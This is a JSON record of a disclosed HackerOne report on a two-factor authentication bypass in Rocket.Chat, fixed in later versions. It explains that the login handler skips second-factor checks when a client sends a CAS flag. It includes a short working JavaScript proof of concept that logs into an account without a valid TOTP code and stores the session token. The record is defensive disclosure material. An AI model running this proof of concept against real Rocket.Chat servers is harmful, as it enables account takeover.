@@ -1,0 +1,205 @@
+{
+  "id": 1448268,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDQ4MjY4",
+  "url": "https://hackerone.com/reports/1448268",
+  "title": "TOTP 2 Factor Authentication Bypass",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2022-01-12T22:25:53.702Z",
+  "submitted_at": "2022-01-12T22:25:53.776Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "gronke",
+    "url": "/gronke",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 19858,
+    "url": "https://hackerone.com/rocket_chat",
+    "handle": "rocket_chat",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Rocket.Chat",
+      "twitter_handle": "RocketChat",
+      "website": "https://rocket.chat",
+      "about": "Rocket.Chat is a company built on open source values and a love for efficiency. The company is driven by our amazing community of contributors."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": true,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "no-content",
+  "cve_ids": [
+    "CVE-2022-35248"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2022-09-22T16:02:53.014Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2022-09-22T12:17:29.832Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "",
+  "weakness": {
+    "id": 27,
+    "name": "Improper Authentication - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2022-10-22T12:17:29.932Z",
+  "allow_singular_disclosure_after": -116614129.6548184,
+  "singular_disclosure_allowed": true,
+  "vote_count": 7,
+  "voters": [
+    "he4am",
+    "shubham_srt",
+    "pr0f0x01",
+    "shivammusic",
+    "mrworst",
+    "destinedtohack",
+    "robbott"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "id": 194882,
+      "category": "team",
+      "content": "## Summary\n\nTwo Factor Authentication can be bypassed when telling the server to use CAS during login.\n\n ## Description\n\nThe 2FA Login Handler skips validation when it finds CAS enabled. When the clients sends the option among the login request, the login proceeds without validation of a second factor.\n\nIn [app/2fa/server/loginHandler.js#L17-L42](https://github.com/RocketChat/Rocket.Chat/blob/c688917ad1cc95087a50c3d4d507a1669e60eec0/app/2fa/server/loginHandler.js#L17-L42) there is a return condition when the `cas` argument is not falsy:\n\n```javascript\ncallbacks.add(\n\t'onValidateLogin',\n\t(login) => {\n\t\tif (login.type === 'resume' || login.type === 'proxy' || login.methodName === 'verifyEmail') {\n\t\t\treturn login;\n\t\t}\n\n\t\tconst [loginArgs] = login.methodArguments;\n\t\t// CAS login doesn't yet support 2FA.\n\t\tif (loginArgs.cas) {\n\t\t\treturn login;\n\t\t}\n\n\t\tconst { totp } = loginArgs;\n\n\t\tcheckCodeForUser({\n\t\t\tuser: login.user,\n\t\t\tcode: totp && totp.code,\n\t\t\toptions: { disablePasswordFallback: true },\n\t\t});\n\n\t\treturn login;\n\t},\n\tcallbacks.priority.MEDIUM,\n\t'2fa',\n);\n```\n\n## Releases Affected:\n\n  * 4.3.1\n  * 3.18.3\n  * develop\n\n## Steps To Reproduce (from initial installation to vulnerability):\n\n  1. Create User account with 2FA enabled\n  2. Logout and open Rocket.Chat login page\n  3. Open Web Inspector\n  4. Paste Proof of Concept (set valid USER/PASSWORD of an account with 2FA enabled)\n\n## Supporting Material/References:\n\n### Proof of Concept\n\n```javscript\nconst USER = \"target\";\nconst PASSWORD = \"correct horse battery staple\";\n\nfetch(\"/api/v1/login\", {\n\tmethod: \"POST\",\n\tbody: `{\n\t\t\"cas\": true,\n\t\t\"totp\": {\n\t\t\t\"code\": \"Not Today\",\n\t\t\t\"type\": \"resume\",\n\t\t\t\"login\": {\n\t\t\t\t\"user\": {\n\t\t\t\t\t\"username\": \"${USER}\"\n\t\t\t\t},\n\t\t\t\t\"password\": \"${PASSWORD}\"\n\t\t\t}\n\t\t}\n\t}`,\n\theaders: {\n\t\t\"Content-Type\": \"application/json\"\n\t}\n})\n.then(res => res.json())\n.then(({ data: { userId, authToken }}) => {\n\tconsole.log(`login as ${userId}`);\n\tMeteor._localStorage.setItem(Accounts.USER_ID_KEY, userId);\n\tMeteor._localStorage.setItem(Accounts.LOGIN_TOKEN_KEY, authToken);\n\twindow.location.reload()\n});\n```\n\n## Suggested mitigation\n\n  * Check on server side whether CAS is enabled and do not only trust the client.\n  * Inform administrators in the UI that CAS conflicts 2FA authentication\n\n## Impact\n\nBypass of 2FA TOTP authentication.\n\n## Fix\nFixed in versions 4.7.5, 4.8.2, 5.0.0>",
+      "updated_at": "2022-09-22T12:17:06.235Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 1989106,
+        "username": "mrd0d",
+        "name": "Offsec team engineer",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "",
+        "created_at": "2021-09-27T20:52:41.370Z",
+        "url": "https://hackerone.com/mrd0d",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/j9d22b8d3wdw2lskn3dviwszwnze/47c72a82657a929c13ab24e11674f7e10ea2bf67b1b9e7116b522cd7ede42f15?response-content-disposition=inline%3B%20filename%3D%22Ghost%20Boy.jpeg%22%3B%20filename%2A%3DUTF-8%27%27Ghost%2520Boy.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQH4M573L%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T050619Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjED0aCXVzLXdlc3QtMiJGMEQCIHjc856ibh3v2GwluPqVEDP26NgivgcnG4nbp5uF66dWAiAUhB62LL2POM6dOooGi3f5Iy%2BIvlYUg0UY4KSXuIjC4iqxBQgFEAMaDDAxMzYxOTI3NDg0OSIMnYbEw%2FHPSs%2FaJft4Ko4Fg0girWCVfrU%2FU%2BnN1YGf61F68MazHDw0uqecu%2FLPdRSSVC%2ByND1OyO%2BJpGOxiK%2F4FEJpCGW2KYFZkvhkh6D78IETcWS%2F172utuGjk84FR6tUVhGgGdyPtGnZfeLZgK8w50KuB0UKCNznNE4b8eaplLgkhU1%2B7UaM1%2Bguf%2B98hMIaIQmbIzIvHgizxOe8vr4MsxTjMbFFhsxujgBmHWzPP4L5wrpLSGMBaC9y6XY8aUtJRR7Y2%2F7opEQHi86oono%2Byq%2BdxXn5yYGIjBWH0UeihgX8ne9e4xEhLxs32k5qlKs1Mf5dL%2BojoIkp8fTHhYhVWvwSN3niM0ORA2ZS0WKGiYQ1XGSidZGGC6cIhEBWTpzeRrFWBTXymkL0l86eF84kG42%2BvEF%2FsSqmXvWexwJnD21vLK9fk5gcduHz%2FyuOXdhVs20B8z%2Fs8ErtoAdN0UfZy7CbCsNOenki2%2B7UECeYRSLoPd69Jec7cSDnwcmoR%2FIsX80nVUFgnRr%2B16NCIKeQnS7bYk5mSYB%2BsEwgwpyrnR4%2Bn2GuVmaiD5Pg76TiLviBonbWpmkiQ%2FA08oy2KerGWqQVxpcaNs3sv5OA4jTCAe4DIu3J6GJNVP1LsvojcClQ1EsDPimNQe2cTq6MpjVG%2F9hLB88whLTQ4rpF7ESPYT58%2FKHZQPbcTbGxkCS5ryWT0G5RjPickZfr8W6bq0%2B21uKorB8508A%2B%2BWWOOJLjjZuU444hlhXKpZIxBlqOuYYkCBgwVw3%2FN7TDKtlI2bmrq%2F1r6TLpmt7kTSJAn3cfs8weZpMoeTUanVhtBJvAykzpn2bq%2FKoWZsZXascvv01Yq6uQm80K4ZzZOvB4Dp9xk0b644UQI77f%2FHSx9cIAMPvvnNIGOrIBQv9oADjkT49R1OsIM3QhkH7bAi%2BjoxR3P%2Fr519DP6lhnyiom5liKbhheC0roEnKuH%2FOtiX%2Bcwokj6YA5Mzxmm0Jrp%2FjOJtw%2BgPkYxRp6O1WAg%2F6VgMYDBa%2FKIBUwZc2zJvPRPbWdaJGAstjblTlzbcFfMktTfrEaWeliuNbyUHPqJ5kvjr95wA2dWrgv1Bud41vnxutdR%2B8dwV9xbPXKogso2UnekN63YvJQ8D7eAdV45Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=eb2595bc7543ac1052877f9ed33601f284475e151774f687f3089347b1600316",
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/j9d22b8d3wdw2lskn3dviwszwnze/8f5393bb06e000811ac3ac31f77f5ce1d049785766c3d25a25cec97adaa9cc12?response-content-disposition=inline%3B%20filename%3D%22Ghost%20Boy.jpeg%22%3B%20filename%2A%3DUTF-8%27%27Ghost%2520Boy.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQH4M573L%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T050619Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjED0aCXVzLXdlc3QtMiJGMEQCIHjc856ibh3v2GwluPqVEDP26NgivgcnG4nbp5uF66dWAiAUhB62LL2POM6dOooGi3f5Iy%2BIvlYUg0UY4KSXuIjC4iqxBQgFEAMaDDAxMzYxOTI3NDg0OSIMnYbEw%2FHPSs%2FaJft4Ko4Fg0girWCVfrU%2FU%2BnN1YGf61F68MazHDw0uqecu%2FLPdRSSVC%2ByND1OyO%2BJpGOxiK%2F4FEJpCGW2KYFZkvhkh6D78IETcWS%2F172utuGjk84FR6tUVhGgGdyPtGnZfeLZgK8w50KuB0UKCNznNE4b8eaplLgkhU1%2B7UaM1%2Bguf%2B98hMIaIQmbIzIvHgizxOe8vr4MsxTjMbFFhsxujgBmHWzPP4L5wrpLSGMBaC9y6XY8aUtJRR7Y2%2F7opEQHi86oono%2Byq%2BdxXn5yYGIjBWH0UeihgX8ne9e4xEhLxs32k5qlKs1Mf5dL%2BojoIkp8fTHhYhVWvwSN3niM0ORA2ZS0WKGiYQ1XGSidZGGC6cIhEBWTpzeRrFWBTXymkL0l86eF84kG42%2BvEF%2FsSqmXvWexwJnD21vLK9fk5gcduHz%2FyuOXdhVs20B8z%2Fs8ErtoAdN0UfZy7CbCsNOenki2%2B7UECeYRSLoPd69Jec7cSDnwcmoR%2FIsX80nVUFgnRr%2B16NCIKeQnS7bYk5mSYB%2BsEwgwpyrnR4%2Bn2GuVmaiD5Pg76TiLviBonbWpmkiQ%2FA08oy2KerGWqQVxpcaNs3sv5OA4jTCAe4DIu3J6GJNVP1LsvojcClQ1EsDPimNQe2cTq6MpjVG%2F9hLB88whLTQ4rpF7ESPYT58%2FKHZQPbcTbGxkCS5ryWT0G5RjPickZfr8W6bq0%2B21uKorB8508A%2B%2BWWOOJLjjZuU444hlhXKpZIxBlqOuYYkCBgwVw3%2FN7TDKtlI2bmrq%2F1r6TLpmt7kTSJAn3cfs8weZpMoeTUanVhtBJvAykzpn2bq%2FKoWZsZXascvv01Yq6uQm80K4ZzZOvB4Dp9xk0b644UQI77f%2FHSx9cIAMPvvnNIGOrIBQv9oADjkT49R1OsIM3QhkH7bAi%2BjoxR3P%2Fr519DP6lhnyiom5liKbhheC0roEnKuH%2FOtiX%2Bcwokj6YA5Mzxmm0Jrp%2FjOJtw%2BgPkYxRp6O1WAg%2F6VgMYDBa%2FKIBUwZc2zJvPRPbWdaJGAstjblTlzbcFfMktTfrEaWeliuNbyUHPqJ5kvjr95wA2dWrgv1Bud41vnxutdR%2B8dwV9xbPXKogso2UnekN63YvJQ8D7eAdV45Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ccc7274fdf0058fab032621114a0852e874be9a407dc322c13cb1675ab9c52bb",
+          "xtralarge": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6MTcwOTk1NSwicHVyIjoiYmxvYl9pZCJ9fQ==--411e69acd3d9e11c3ba8656ec1816fb37b995665/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJqcGVnIiwicmVzaXplIjoiMjYweDI2MFx1MDAzZSJ9LCJwdXIiOiJ2YXJpYXRpb24ifX0=--077a116fdc5fd6949baa55fe21d29943970c85dc/Ghost%20Boy.jpeg"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "1448268",
+  "votes": 7,
+  "latest_disclosable_activity_at": "2022-09-22T16:02:52.935Z",
+  "_metadata": {
+    "saved_at": "2026-07-03T13:06:19.740654",
+    "source": "https://hackerone.com/reports/1448268.json",
+    "report_id": 1448268
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDQ4MjY4",
+    "databaseId": "1448268",
+    "title": "TOTP 2 Factor Authentication Bypass",
+    "url": "https://hackerone.com/reports/1448268",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2022-09-22T16:02:53.014Z",
+    "created_at": "2022-01-12T22:25:53.702Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzI3",
+      "name": "Improper Authentication - Generic",
+      "external_id": "cwe-287"
+    },
+    "severity": {
+      "rating": "high",
+      "score": null
+    },
+    "reporter": {
+      "username": "gronke"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpWdWxuZXJhYmlsaXR5RGlzY2xvc3VyZVByb2dyYW0vMTk4NTg=",
+      "handle": "rocket_chat",
+      "name": "Rocket.Chat",
+      "url": "https://hackerone.com/rocket_chat",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": []
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzE0NDgyNjg=",
+    "_id": "1448268",
+    "disclosed": true,
+    "votes": 7,
+    "latest_disclosable_activity_at": "2022-09-22T16:02:52.935Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDQ4MjY4",
+      "databaseId": "1448268",
+      "title": "TOTP 2 Factor Authentication Bypass",
+      "url": "https://hackerone.com/reports/1448268",
+      "disclosed_at": "2022-09-22T16:02:53.014Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpWdWxuZXJhYmlsaXR5RGlzY2xvc3VyZVByb2dyYW0vMTk4NTg=",
+      "handle": "rocket_chat",
+      "name": "Rocket.Chat",
+      "url": "https://hackerone.com/rocket_chat",
+      "currency": "usd"
+    }
+  }
+}
